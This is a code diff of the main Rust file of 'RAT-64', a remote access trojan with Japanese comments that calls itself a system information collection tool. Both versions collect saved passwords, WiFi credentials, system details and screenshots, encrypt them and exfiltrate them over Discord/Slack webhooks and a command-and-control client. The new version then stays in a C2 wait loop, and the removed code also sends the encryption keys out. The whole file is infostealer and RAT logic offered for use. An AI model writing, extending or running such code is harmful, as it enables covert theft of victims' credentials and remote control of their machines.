@@ -1,212 +1,172 @@
-// RAT-64 - 統合システム情報収集ツール
+// RAT-64 - モジュール化された統合システム情報収集ツール
 use rmp_serde::encode::to_vec as to_msgpack_vec;
 use rand::RngCore;
+use rat_64::{
+    encrypt_data_with_key, 
+    load_config_or_default, 
+    IntegratedPayload, 
+    send_unified_webhook,
+    execute_rat_operations,
+    C2Client
+};
 
-use rat_64::{collect_auth_data_with_config, encrypt_data_with_key, is_admin};
-
-#[cfg(feature = "screenshot")]
-use rat_64::modules::screen_capture::{capture_screenshot, capture_all_displays, ScreenshotConfig};
-
-// スクリーンショット収集統合版
-fn collect_screenshots() -> rat_64::ScreenshotData {
-    let capture_time = format!("{:?}", std::time::SystemTime::now());
+#[tokio::main]
+async fn main() -> Result<(), Box<dyn std::error::Error>> {
+    println!("🦀 RAT-64 システム情報収集ツール (強化版) 起動中...");
     
-    #[cfg(feature = "screenshot")]
-    {
-        let config = ScreenshotConfig::default();
-        let primary_display = capture_screenshot(&config)
-            .map(Some)
-            .unwrap_or(None);
+    // 設定読み込み
+    let config = load_config_or_default();
+    println!("✅ 設定読み込み完了");
+    
+    // 設定検証
+    if let Err(e) = rat_64::core::config::validate_config(&config) {
+        println!("❌ 設定エラー: {}", e);
+        return Ok(());
+    }
+
+    // C2クライアントの初期化
+    let mut c2_client = C2Client::new(config.clone());
+    
+    // 統合データ収集（メイン処理）
+    if config.command_server_enabled {
+        println!("🔍 データ収集開始...");
+        match perform_main_data_collection(&config, &mut c2_client).await {
+            Ok(()) => println!("✅ データ収集完了"),
+            Err(e) => {
+                eprintln!("❌ データ収集エラー: {}", e);
+                return Ok(());
+            }
+        }
         
-        let all_displays = capture_all_displays(&config)
-            .unwrap_or_else(|_| Vec::new());
-        
-        let primary_count = if primary_display.is_some() { 1 } else { 0 };
-        rat_64::ScreenshotData {
-            primary_display,
-            total_count: all_displays.len() + primary_count,
-            all_displays,
-            capture_time,
-        }
-    }
-    
-    #[cfg(not(feature = "screenshot"))]
-    {
-        rat_64::ScreenshotData {
-            primary_display: None,
-            all_displays: Vec::new(),
-            capture_time,
-            total_count: 0,
-        }
-    }
-}
-
-fn main() -> Result<(), Box<dyn std::error::Error>> {
-    // 権限チェック（サイレント）
-    let _admin_mode = is_admin();
-    
-    // 引数なしでデフォルト実行（全機能有効）
-    execute_full_rat_system()
-}
-
-fn execute_full_rat_system() -> Result<(), Box<dyn std::error::Error>> {
-    let config = rat_64::load_config_or_default();
-    
-    // システム情報収集（常に実行）
-    let system_info = rat_64::get_system_info()
-        .map_err(|e| format!("システム情報収集エラー: {}", e))?;
-    
-    // 認証情報収集（常に実行）
-    let auth_data = collect_auth_data_with_config(&config);
-
-    // Webhook送信（データ収集後すぐに送信）
-    #[cfg(feature = "network")]
-    send_webhook_notification(&config, &system_info, &auth_data);
-
-    // スクリーンショット収集（常に実行）
-    let screenshot_data = collect_screenshots();
-
-    // データ統合とシリアライゼーション
-    #[derive(serde::Serialize)]
-    struct FullData {
-        system_info: rat_64::SystemInfo,
-        auth_data: rat_64::AuthData,
-        screenshot_data: rat_64::ScreenshotData,
-    }
-    
-    let full_data = FullData { system_info, auth_data, screenshot_data };
-    let data = to_msgpack_vec(&full_data)?;
-    
-    // 暗号化キー生成と暗号化
-    let mut key = [0u8; 32];
-    let mut nonce = [0u8; 12];
-    rand::rng().fill_bytes(&mut key);
-    rand::rng().fill_bytes(&mut nonce);
-
-    let encrypted_data = encrypt_data_with_key(&data, &key, &nonce)?;
-    
-    // 暗号化データ保存のみ
-    save_data_only(&encrypted_data)?;
-    
-    // 暗号化キーをWebhookで送信
-    #[cfg(feature = "network")]
-    send_encryption_key_webhook(&config, &key, &nonce);
-    
-    // ローカルにもキーファイルを保存（復号化用）
-    save_key_file(&key, &nonce)?;
-    
-    // ネットワーク機能（常に実行）
-    #[cfg(feature = "network")]
-    {
-        println!("🌐 Auto-uploading collected data...");
-        match rat_64::upload_data_file() {
-            Ok(msg) => {
-                println!("{}", msg);
-                println!("📤 Data successfully uploaded to cloud storage!");
-            },
-            Err(e) => eprintln!("❌ Upload error: {}", e),
-        }
-    }
-    
-    Ok(())
-}
-
-// 統合ファイル保存関数
-fn save_data_only(encrypted_data: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
-    // 暗号化データ保存のみ
-    std::fs::write("data.dat", encrypted_data)?;
-    Ok(())
-}
-
-// キーファイル保存関数
-fn save_key_file(key: &[u8; 32], nonce: &[u8; 12]) -> Result<(), Box<dyn std::error::Error>> {
-    use base64::{engine::general_purpose::STANDARD, Engine};
-    
-    let key_b64 = STANDARD.encode(key);
-    let nonce_b64 = STANDARD.encode(nonce);
-    
-    // key.txt形式で保存（復号化ツール用）
-    let key_content = format!("{}\n{}\n", key_b64, nonce_b64);
-    std::fs::write("key.txt", key_content)?;
-    
-    // key.json形式でも保存（バックアップ用）
-    let key_json = serde_json::json!({
-        "key": key_b64,
-        "nonce": nonce_b64,
-        "timestamp": std::time::SystemTime::now()
-            .duration_since(std::time::UNIX_EPOCH)
-            .unwrap()
-            .as_secs()
-    });
-    std::fs::write("key.json", serde_json::to_string_pretty(&key_json)?)?;
-    
-    println!("🔑 Encryption keys saved to key.txt and key.json");
-    
-    Ok(())
-}
-
-// Webhook送信関数
-#[cfg(feature = "network")]
-fn send_webhook_notification(config: &rat_64::Config, system_info: &rat_64::SystemInfo, auth_data: &rat_64::AuthData) {
-    use rat_64::modules::notification_sender::{WebhookConfig, WebhookType, send_webhook};
-    
-    // WebhookConfig作成
-    let webhook_config = WebhookConfig {
-        webhook_url: if config.webhook_url.is_empty() {
-            None
-        } else {
-            Some(config.webhook_url.clone())
-        },
-        webhook_type: match config.webhook_type.as_str() {
-            "Discord" => WebhookType::Discord,
-            "Slack" => WebhookType::Slack,
-            "Custom" => WebhookType::Custom,
-            _ => WebhookType::None,
-        },
-        retry_attempts: config.retry_attempts,
-        timeout_seconds: config.timeout_seconds,
-    };
-    
-    // Webhook送信
-    if webhook_config.webhook_url.is_some() {
-        println!("📡 Sending webhook notification...");
-        match send_webhook(&webhook_config, system_info, auth_data) {
-            Ok(_) => println!("✅ Webhook sent successfully!"),
-            Err(e) => eprintln!("❌ Webhook error: {}", e),
+        // データ収集完了後、C2待機状態に移行
+        println!("\n🎯 データ収集完了 - C2待機モードに移行");
+        if let Err(e) = c2_client.start_c2_loop().await {
+            eprintln!("🎯 C2 error: {}", e);
         }
     } else {
-        println!("⚠️ Webhook URL not configured");
+        // C2機能が無効な場合は一回限りの実行
+        println!("🔍 データ収集開始（一回限り実行）...");
+        match perform_main_data_collection(&config, &mut c2_client).await {
+            Ok(()) => println!("✅ データ収集完了"),
+            Err(e) => eprintln!("❌ データ収集エラー: {}", e),
+        }
+        println!("🎯 C2機能が無効のため終了します");
     }
+    
+    Ok(())
 }
 
-// 暗号化キーWebhook送信関数
-#[cfg(feature = "network")]
-fn send_encryption_key_webhook(config: &rat_64::Config, key: &[u8; 32], nonce: &[u8; 12]) {
-    use rat_64::modules::notification_sender::{WebhookConfig, WebhookType, send_encryption_key_webhook};
-    
-    // WebhookConfig作成
-    let webhook_config = WebhookConfig {
-        webhook_url: if config.webhook_url.is_empty() {
-            None
-        } else {
-            Some(config.webhook_url.clone())
-        },
-        webhook_type: match config.webhook_type.as_str() {
-            "Discord" => WebhookType::Discord,
-            "Slack" => WebhookType::Slack,
-            "Custom" => WebhookType::Custom,
-            _ => WebhookType::None,
-        },
-        retry_attempts: config.retry_attempts,
-        timeout_seconds: config.timeout_seconds,
-    };
-    
-    // 暗号化キーを送信
-    if webhook_config.webhook_url.is_some() {
-        println!("🔑 Sending encryption keys...");
-        match send_encryption_key_webhook(&webhook_config, key, nonce) {
-            Ok(_) => println!("✅ Encryption keys sent successfully!"),
-            Err(e) => eprintln!("❌ Key sending error: {}", e),
+/// メインのデータ収集処理
+async fn perform_main_data_collection(
+    config: &rat_64::Config, 
+    c2_client: &mut C2Client
+) -> Result<(), Box<dyn std::error::Error>> {
+    match IntegratedPayload::create_with_config(&config).await {
+        Ok(mut payload) => {
+            println!("✅ データ収集完了:");
+            println!("   - システム情報: {}", payload.system_info.hostname);
+            println!("   - パスワード: {}件", payload.auth_data.passwords.len());
+            println!("   - WiFi認証: {}件", payload.auth_data.wifi_creds.len());
+            
+            if let Some(ref screenshot_data) = payload.screenshot_data {
+                println!("   - スクリーンショット: {}件", screenshot_data.total_count);
+            }
+            
+            // データ暗号化
+            println!("🔒 データ暗号化中...");
+            let serialized = match to_msgpack_vec(&payload) {
+                Ok(data) => data,
+                Err(e) => {
+                    println!("❌ シリアル化エラー: {}", e);
+                    return Ok(());
+                }
+            };
+            let (encrypted, encryption_key, encryption_nonce) = match encrypt_with_random_key(&serialized) {
+                Ok(data) => data,
+                Err(e) => {
+                    println!("❌ 暗号化エラー: {}", e);
+                    return Ok(());
+                }
+            };
+            
+            // デバッグ用：キーとナンスを出力（本番環境では削除）
+            #[cfg(debug_assertions)]
+            {
+                println!("🔑 DEBUG - Key: {}", base64::Engine::encode(&base64::engine::general_purpose::STANDARD_NO_PAD, &encryption_key));
+                println!("🎲 DEBUG - Nonce: {}", base64::Engine::encode(&base64::engine::general_purpose::STANDARD_NO_PAD, &encryption_nonce));
+            }
+            
+            // キーとノンスをペイロードに設定
+            payload.set_encryption_info(&encryption_key, &encryption_nonce);
+            
+            println!("✅ データ暗号化完了 ({}バイト)", encrypted.len());
+            
+            // C2サーバーにデータをアップロード
+            if config.command_server_enabled {
+                match c2_client.upload_collected_data(&payload).await {
+                    Ok(()) => println!("✅ データサーバーアップロード成功"),
+                    Err(e) => println!("❌ データサーバーアップロード失敗: {}", e),
+                }
+            }
+            
+            // ファイル保存
+            let output_file = "data.dat";
+            match std::fs::write(output_file, &encrypted) {
+                Ok(()) => println!("💾 暗号化データを{}に保存完了", output_file),
+                Err(e) => println!("❌ ファイル保存エラー: {}", e),
+            }
+            
+            // Webhook送信
+            if config.webhook_enabled {
+                println!("📡 Webhook送信中...");
+                match send_unified_webhook(&payload, &config).await {
+                    Ok(()) => println!("✅ Webhook送信成功"),
+                    Err(e) => println!("❌ Webhook送信失敗: {}", e),
+                }
+            } else {
+                println!("ℹ️  Webhook送信は無効化されています");
+            }
+            
+            // 実行結果サマリー
+            println!("\n📊 実行結果サマリー:");
+            match execute_rat_operations(&config).await {
+                Ok(summary) => println!("{}", summary),
+                Err(e) => println!("❌ サマリー生成エラー: {}", e),
+            }
+        }
+        Err(e) => {
+            println!("❌ データ収集エラー: {}", e);
+            return Ok(()); // エラーが発生してもプログラム自体は正常終了
         }
     }
+    
+    println!("\n🎯 RAT-64 メイン処理完了！");
+    
+    // デバッグ用：少し待機
+    #[cfg(debug_assertions)]
+    {
+        println!("Press any key to exit...");
+        let mut input = String::new();
+        std::io::stdin().read_line(&mut input).ok();
+    }
+    
+    Ok(())
+}
+
+// ランダムキーでの暗号化ヘルパー（キーとノンスも返す）
+fn encrypt_with_random_key(data: &[u8]) -> Result<(Vec<u8>, [u8; 32], [u8; 12]), rat_64::RatError> {
+    let mut key = [0u8; 32];
+    let mut nonce = [0u8; 12];
+    
+    rand::rng().fill_bytes(&mut key);
+    rand::rng().fill_bytes(&mut nonce);
+    
+    let encrypted = encrypt_data_with_key(data, &key, &nonce)?;
+    Ok((encrypted, key, nonce))
+}
+
+// 非Windows環境用のダミー実装
+#[cfg(not(windows))]
+fn is_admin() -> bool {
+    false // Unix系では簡単にはチェックできないため false を返す
 }
